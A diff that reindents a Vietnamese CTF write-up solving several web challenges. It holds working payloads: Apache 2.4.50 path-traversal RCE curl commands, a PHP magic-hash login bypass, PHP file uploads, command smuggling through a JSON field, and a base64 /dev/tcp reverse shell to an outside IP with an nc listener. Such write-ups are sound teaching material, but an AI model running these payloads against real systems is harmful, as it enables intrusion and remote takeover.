@@ -10,11 +10,11 @@
 - `httpd.conf` là file config của Apache Server, truy cập vào file theo đường dẫn, mình nhận thấy có một số thứ hay ho:
 
 ```apache2
-    <Directory "/usr/local/apache2/cgi-bin">
-        AllowOverride None
-        Options None
-        Require all granted
-    </Directory>
+<Directory "/usr/local/apache2/cgi-bin">
+    AllowOverride None
+    Options None
+    Require all granted
+</Directory>
 ```
 
 - Trong thời gian gần đây, có 2 CVE nổi tiếng liên quan đến 2 phiên bản của Apache và `cgi-bin` của nó, đó là [CVE-2021-41773](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773) (Apache 2.4.49) và [CVE-2021-42013](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-42013) (Apache 2.4.50), đặc điểm chung là lỗi trong việc normalize path ở file `util.c` khiến tin tặc có thể sử dụng `path traversal` với payload thường thấy là `/cgi-bin/../../../etc.passwd`, nhưng, vì `util.c` đã check dấu `.` khi normalize path, nên chúng ta sẽ cần dùng tới những payload được encode như `/.%2e/` thay cho `/../`.
@@ -28,13 +28,13 @@
     Và có được kết quả:
 
     ```shell
-        PORT     STATE SERVICE REASON  VERSION
-        8889/tcp open  http    syn-ack Apache httpd 2.4.50 ((Unix))
-        | http-methods: 
-        |   Supported Methods: HEAD GET POST OPTIONS TRACE
-        |_  Potentially risky methods: TRACE
-        |_http-title: Site doesn't have a title (text/html).
-        |_http-server-header: Apache/2.4.50 (Unix)
+    PORT     STATE SERVICE REASON  VERSION
+    8889/tcp open  http    syn-ack Apache httpd 2.4.50 ((Unix))
+    | http-methods: 
+    |   Supported Methods: HEAD GET POST OPTIONS TRACE
+    |_  Potentially risky methods: TRACE
+    |_http-title: Site doesn't have a title (text/html).
+    |_http-server-header: Apache/2.4.50 (Unix)
     ```
 
 - Như vậy là Apache 2.4.50, ta có thể dùng `%%32%65%%32%65/` hoặc `.%%32%65/` thay thế cho `../`
@@ -58,7 +58,7 @@
 - Thực tế có một cách khác, ta sẽ dùng đến `/bin/sh` và option `--data` của `curl` để mở file, đơn giản như sau:
 
     ```shell
-        curl 'http://139.180.208.121:8889/nothingspecial/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo; cat ../flag'
+    curl 'http://139.180.208.121:8889/nothingspecial/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo; cat ../flag'
     ```
 
 - Và đây là kết quả:
@@ -80,34 +80,34 @@
 - Thử xem source code của bài xem sao? (Source code khá dài, nên mình sẽ cắt từ đoạn form đến hết hint)
 
     ```html
-        <form action="verify.php" method="post">
-            User Name:<br>
-            <input type="text" name="username"><br><br>
-            Password:<br>
-            <input type="password" name="password"><br><br>
-            <input type="submit" name="submit" value="Login">
-        </form>
-        <!--
-        if(isset($_POST['submit'])){
-                if ((int) $_POST['password'] === (int) "8xdeadbeef"){
-                    $usr = $_POST['username'];
-                    $pas = hash('sha256', htmlentities($_POST['password']));
-                    if($pas == "0" && strcmp("ahihi", $usr) == 0 && $usr != "ahihi"){
-                        session_start();
-                        $_SESSION['logged'] = TRUE;
-                        header("Location: chall.php");
-                        exit;
-                        }
-                }else{
-
-                    header("Location: index.php");
+    <form action="verify.php" method="post">
+        User Name:<br>
+        <input type="text" name="username"><br><br>
+        Password:<br>
+        <input type="password" name="password"><br><br>
+        <input type="submit" name="submit" value="Login">
+    </form>
+    <!--
+    if(isset($_POST['submit'])){
+            if ((int) $_POST['password'] === (int) "8xdeadbeef"){
+                $usr = $_POST['username'];
+                $pas = hash('sha256', htmlentities($_POST['password']));
+                if($pas == "0" && strcmp("ahihi", $usr) == 0 && $usr != "ahihi"){
+                    session_start();
+                    $_SESSION['logged'] = TRUE;
+                    header("Location: chall.php");
                     exit;
-                }
-        }else{
+                    }
+            }else{
+
                 header("Location: index.php");
                 exit;
-        }
-        ?>
+            }
+    }else{
+            header("Location: index.php");
+            exit;
+    }
+    ?>
     ```
 
 - Vậy là chúng ta có gợi ý về code PHP của back-end, hãy thử phân tích nó một chút, để dễ dàng theo dõi, mình sẽ gán đoạn PHP vào Vim để nhìn theo line-number:
@@ -131,7 +131,7 @@
 - Như vậy, password phải bắt đầu bằng `8` và có mã hash SHA256 bắt đầu bằng `"0e"`, theo link ở trên, mình tìm được mã này:
 
     ```text
-        8W-vW:5ghashcat:0e99625202804787226908207582077273485674961623832383874594371630 (note: the plaintext has a colon in the middle)
+    8W-vW:5ghashcat:0e99625202804787226908207582077273485674961623832383874594371630 (note: the plaintext has a colon in the middle)
     ```
 
 - Như vậy password sẽ là `8W-vW:5ghashcat`
@@ -157,20 +157,20 @@
 - Ta đã vào được trang `chall.php` đúng như điều kiện của back-end PHP ở trên, Ctrl U để xem source code nào:
 
 ```php
-    if(isset($_FILES['file'])){
-      if($_FILES['file']['size'] > 1048576){
-         $errors='File size must be excately 1 MB';
-      }
+if(isset($_FILES['file'])){
+  if($_FILES['file']['size'] > 1048576){
+     $errors='File size must be excately 1 MB';
+  }
 
-      if(empty($errors)==true){
-        $up = "uploads/".rand().".".explode(".",$_FILES['file']['name'])[1];
-        move_uploaded_file($_FILES['file']['tmp_name'],$up);
-        echo "File uploaded successfully\n";
-        echo '<p><a href='. $up .' target="_blank">File</a></p>';
-      }else{
-         echo $errors;
-      }
-   }
+  if(empty($errors)==true){
+    $up = "uploads/".rand().".".explode(".",$_FILES['file']['name'])[1];
+    move_uploaded_file($_FILES['file']['tmp_name'],$up);
+    echo "File uploaded successfully\n";
+    echo '<p><a href='. $up .' target="_blank">File</a></p>';
+  }else{
+     echo $errors;
+  }
+}
 ```
 
 - Đây là source code PHP cho phần upload file, có thể thấy ta có thể upload bất cứ file gì, miễn là đừng vượt quá `1048576 bytes` là được
@@ -196,9 +196,9 @@
 - Đầu tiên, chuẩn bị 1 file PHP như sau:
 
     ```php
-        <?php
-            phpinfo();
-        ?>
+    <?php
+        phpinfo();
+    ?>
     ```
 
 - Tìm `disable_functions`, thu được danh sách các funcion bị chặn:
@@ -210,32 +210,32 @@
 - Đầu tiên cần list file:
 
     ```php
-        <?php
-            $cur = dir(".");
-            $par = dir("..");
+    <?php
+        $cur = dir(".");
+        $par = dir("..");
 
-            echo "Current:<br>";
-            while (($file = $cur->read()) !== false){
-            echo "filename: " . $file . "<br>";
-            } 
+        echo "Current:<br>";
+        while (($file = $cur->read()) !== false){
+        echo "filename: " . $file . "<br>";
+        } 
 
-            echo "Parent:<br>";
-            while (($file = $par->read()) !== false){
-            echo "filename: " . $file . "<br>";
-            } 
-            $cur->close();
-            $par->close();
-        ?> 
+        echo "Parent:<br>";
+        while (($file = $par->read()) !== false){
+        echo "filename: " . $file . "<br>";
+        } 
+        $cur->close();
+        $par->close();
+    ?> 
     ```
 
 - Upload lên và mở file, thu được danh sách file trong thư mục hiện tại và thư mục cha, để ý thấy trong thư mục cha có file `fl@@@g_1337_ahiahi.txt`, đến đây thì path traversal cũng được, tạo file PHP cũng được:
 
     ```php
-        <?php
-            echo "<p>";
-            include '../fl@@@g_1337_ahiahi.txt';
-            echo "</p>";
-        ?>
+    <?php
+        echo "<p>";
+        include '../fl@@@g_1337_ahiahi.txt';
+        echo "</p>";
+    ?>
     ```
 
 - Dù là cách nào thì cuối cùng cũng thu được flag:
@@ -261,70 +261,70 @@
 - Vì source khá dài nên mình sẽ phân tích từng hàm một, bỏ qua hàm index, vì nó in ra trang mà chúng ta truy cập vào đầu tiên
 
     ```python
-        @app.route('/getData', methods=['GET'])
-        def getLog():
-            log_file = flask.request.args.get('f')
-            if (log_file.startswith('/fus/data')):
-                return flask.send_file(log_file, mimetype='text/plain', as_attachment=False)
-            else:
-                return ({'status': 'invalid path'},200)
+    @app.route('/getData', methods=['GET'])
+    def getLog():
+        log_file = flask.request.args.get('f')
+        if (log_file.startswith('/fus/data')):
+            return flask.send_file(log_file, mimetype='text/plain', as_attachment=False)
+        else:
+            return ({'status': 'invalid path'},200)
     ```
 
 - Ok, đây chính là hàm mà chúng ta dùng để đọc file và thực hiện path traversal, không có nhiều điều để nói về nó.
 
     ```python
-        # run script to crawl data
-        @app.route('/runScript')
-        def runScript():
-            json = flask.request.json
-            msg = start(json)
-            return ({'status': msg},200)
+    # run script to crawl data
+    @app.route('/runScript')
+    def runScript():
+        json = flask.request.json
+        msg = start(json)
+        return ({'status': msg},200)
 
-        def check_script_dup(scripts, command_log, json):
-            try:
-                script_parent_dir = scripts + '/' + json['dir']
-                script_path = script_parent_dir + '/' + json['name']
-            except:
-                return "missing dir and name"
-            if os.path.exists(script_path):
-                return "duplicate script"
-            else:
-                if not os.path.exists(script_parent_dir):
-                    os.makedirs(script_parent_dir)
-                return download_script(script_path, command_log, json)
+    def check_script_dup(scripts, command_log, json):
+        try:
+            script_parent_dir = scripts + '/' + json['dir']
+            script_path = script_parent_dir + '/' + json['name']
+        except:
+            return "missing dir and name"
+        if os.path.exists(script_path):
+            return "duplicate script"
+        else:
+            if not os.path.exists(script_parent_dir):
+                os.makedirs(script_parent_dir)
+            return download_script(script_path, command_log, json)
 
-        def download_script(script_path, command_log, json):
-            try:
-                script_link = json['url']
-            except:
-                return "missing url"
-            # don't trust anyone
-            if (urllib.parse.urlparse(script_link).netloc == "localhost:8888"):
-                result = requests.get(script_link)
-                with open(script_path, 'wb') as f:
-                    f.write(result.content)
-                    run_script(script_path, command_log)
-            else:
-                return "invalid script link"
+    def download_script(script_path, command_log, json):
+        try:
+            script_link = json['url']
+        except:
+            return "missing url"
+        # don't trust anyone
+        if (urllib.parse.urlparse(script_link).netloc == "localhost:8888"):
+            result = requests.get(script_link)
+            with open(script_path, 'wb') as f:
+                f.write(result.content)
+                run_script(script_path, command_log)
+        else:
+            return "invalid script link"
 
-        def run_script(script_path, command_log):
-            lf = open(command_log, 'wb+')
-            command = subprocess.Popen(['bash', script_path], stderr=lf, stdout=lf, universal_newlines=True)
-            return "Run successfully"
+    def run_script(script_path, command_log):
+        lf = open(command_log, 'wb+')
+        command = subprocess.Popen(['bash', script_path], stderr=lf, stdout=lf, universal_newlines=True)
+        return "Run successfully"
 
-        def start(json):
-            scripts = home + '/scripts'
-            log = home + '/logs'
-            if not os.path.exists(scripts):
-                os.makedirs(scripts)
-            if not os.path.exists(log):
-                os.makedirs(log)
-            try:
-                command_log = log + '/' + json['command_log'] + '.txt'
-            except:
-                return "missing command_log"
-            msg = check_script_dup(scripts, command_log, json)
-            return msg
+    def start(json):
+        scripts = home + '/scripts'
+        log = home + '/logs'
+        if not os.path.exists(scripts):
+            os.makedirs(scripts)
+        if not os.path.exists(log):
+            os.makedirs(log)
+        try:
+            command_log = log + '/' + json['command_log'] + '.txt'
+        except:
+            return "missing command_log"
+        msg = check_script_dup(scripts, command_log, json)
+        return msg
     ```
 
 - Mình sẽ để cả 5 hàm này chung với nhau, vì chúng liên quan mật thiết với nhau, và cũng là tiền đề cho mọi thứ
@@ -352,24 +352,24 @@
 - URL để nhận file JSON là `http://139.180.208.121:8001/runScript`, để gửi JSON lên thì mình sử dụng `curl` như sau:
 
     ```bash
-        curl -X GET http://139.180.208.121:8001/runScript -H 'Content-Type: application/json' -d '{json}'
+    curl -X GET http://139.180.208.121:8001/runScript -H 'Content-Type: application/json' -d '{json}'
     ```
 
 - Mình sẽ thử tạo một JSON như sau:
 
     ```json
-        {
-            "dir" : "test",
-            "name" : "ls",
-            "command_log" : "log",
-            "url" : "http://localhost:8888/"
-        }
+    {
+        "dir" : "test",
+        "name" : "ls",
+        "command_log" : "log",
+        "url" : "http://localhost:8888/"
+    }
     ```
 
 - Ghép lại với `curl`:
 
     ```shell
-        curl -X GET http://139.180.208.121:8001/runScript -H 'Content-Type: application/json' -d '{"dir" : "test", "name" : "ls", "command_log" : "log", "url" : "http://localhost:8888/"}'
+    curl -X GET http://139.180.208.121:8001/runScript -H 'Content-Type: application/json' -d '{"dir" : "test", "name" : "ls", "command_log" : "log", "url" : "http://localhost:8888/"}'
     ```
 
 - Và sau khi gửi, truy cập vào `http://139.180.208.121:8001/getData?f=/fus/data/../logs/log.txt` để xem kết quả của câu lệnh là gì (ta biết `logs` cùng chung thư mục cha với `data` khi xem code):
@@ -391,16 +391,16 @@
 - Như vậy mình tạo JSON mới và lệnh `curl` mới như sau:
 
     ```json
-        {
-            "dir" : "test",
-            "name" : "ls.sh",
-            "command_log" : "lssh",
-            "url" : "http://localhost:8888/getData?f=/fus/data/../logs/log.txt"
-        }
+    {
+        "dir" : "test",
+        "name" : "ls.sh",
+        "command_log" : "lssh",
+        "url" : "http://localhost:8888/getData?f=/fus/data/../logs/log.txt"
+    }
     ```
 
     ```shell
-        curl -X GET http://139.180.208.121:8001/runScript -H 'Content-Type: application/json' -d '{"dir" : "test", "name" : "ls.sh", "command_log" : "lssh", "url" : "http://localhost:8888/getData?f=/fus/data/../logs/log.txt"}'
+    curl -X GET http://139.180.208.121:8001/runScript -H 'Content-Type: application/json' -d '{"dir" : "test", "name" : "ls.sh", "command_log" : "lssh", "url" : "http://localhost:8888/getData?f=/fus/data/../logs/log.txt"}'
     ```
 
 - Và gửi đi, giờ chỉ cần mở file `lssh.txt` bằng path traversal và thu được kết quả:
@@ -422,7 +422,7 @@
 - Vậy là mình cần cách khác, nhưng trước tiên, phải chuẩn bị cái reverse shell đã :D
 
     ```shell
-        sh -i >& /dev/tcp/34.92.153.161/8899 0>&1
+    sh -i >& /dev/tcp/34.92.153.161/8899 0>&1
     ```
 
 - Có cả revshell của `bash`, `nc`, ..., tìm hiểu tại [đây](https://www.revshells.com/)
@@ -430,28 +430,28 @@
 - Vẫn là tác giả đã gợi ý cho mình một cách để đẩy được revshell kia lên, sử dụng `base64`, chuyển đoạn shell ở trên thành `base64` encode, và đưa về dạng sau:
 
     ```shell
-        echo "c2ggLWkgPiYgL2Rldi90Y3AvMzQuOTIuMTUzLjE2MS84ODk5IDA+JjEK" | base64 -d | bash
+    echo "c2ggLWkgPiYgL2Rldi90Y3AvMzQuOTIuMTUzLjE2MS84ODk5IDA+JjEK" | base64 -d | bash
     ```
 
 - Vậy là xong, giờ cần chuẩn bị request đầu tiên (hãy nhớ escape string :v):
 
     ```json
-        {
-            "dir" : "rev",
-            "name" : "\necho \"c2ggLWkgPiYgL2Rldi90Y3AvMzQuOTIuMTUzLjE2MS84ODk5IDA+JjE=\" | base64 -d | bash\n",
-            "command_log" : "rev",
-            "url" : "http://localhost:8888/"
-        }
+    {
+        "dir" : "rev",
+        "name" : "\necho \"c2ggLWkgPiYgL2Rldi90Y3AvMzQuOTIuMTUzLjE2MS84ODk5IDA+JjE=\" | base64 -d | bash\n",
+        "command_log" : "rev",
+        "url" : "http://localhost:8888/"
+    }
     ```
 
     ```shell
-        curl -X GET http://139.180.208.121:8001/runScript -H 'Content-Type: application/json' -d '{"dir" : "rev","name" : "\necho \"c2ggLWkgPiYgL2Rldi90Y3AvMzQuOTIuMTUzLjE2MS84ODk5IDA+JjE=\" | base64 -d | bash\n","command_log" : "rev","url" : "http://localhost:8888/"}'
+    curl -X GET http://139.180.208.121:8001/runScript -H 'Content-Type: application/json' -d '{"dir" : "rev","name" : "\necho \"c2ggLWkgPiYgL2Rldi90Y3AvMzQuOTIuMTUzLjE2MS84ODk5IDA+JjE=\" | base64 -d | bash\n","command_log" : "rev","url" : "http://localhost:8888/"}'
     ```
 
 - Gửi đi, và trước khi đến với lần request thứ 2, mình phải tạo một listener trên máy của mình đã (thực ra là VPS mình mượn của một người bạn xứ cảng):
 
     ```shell
-        nc -lvnp 8899
+    nc -lvnp 8899
     ```
 
     ![listener](img/PRP201_9.png)
@@ -459,16 +459,16 @@
 - Giờ để listener ở đó, ta quay lại với request thứ 2, request để chạy revshell:
 
     ```json
-        {
-            "dir" : "rev_tcp",
-            "name" : "rev_tcp.sh",
-            "command_log" : "rev",
-            "url" : "http://localhost:8888/getData?f=/fus/data/../logs/rev.txt"
-        }
+    {
+        "dir" : "rev_tcp",
+        "name" : "rev_tcp.sh",
+        "command_log" : "rev",
+        "url" : "http://localhost:8888/getData?f=/fus/data/../logs/rev.txt"
+    }
     ```
 
     ```shell
-        curl -X GET http://139.180.208.121:8001/runScript -H 'Content-Type: application/json' -d '{"dir" : "rev_tcp","name" : "rev_tcp.sh","command_log" : "rev","url" : "http://localhost:8888/getData?f=/fus/data/../logs/rev.txt"}'
+    curl -X GET http://139.180.208.121:8001/runScript -H 'Content-Type: application/json' -d '{"dir" : "rev_tcp","name" : "rev_tcp.sh","command_log" : "rev","url" : "http://localhost:8888/getData?f=/fus/data/../logs/rev.txt"}'
     ```
 
 - Và gửi đi, rồi quay lại listener:
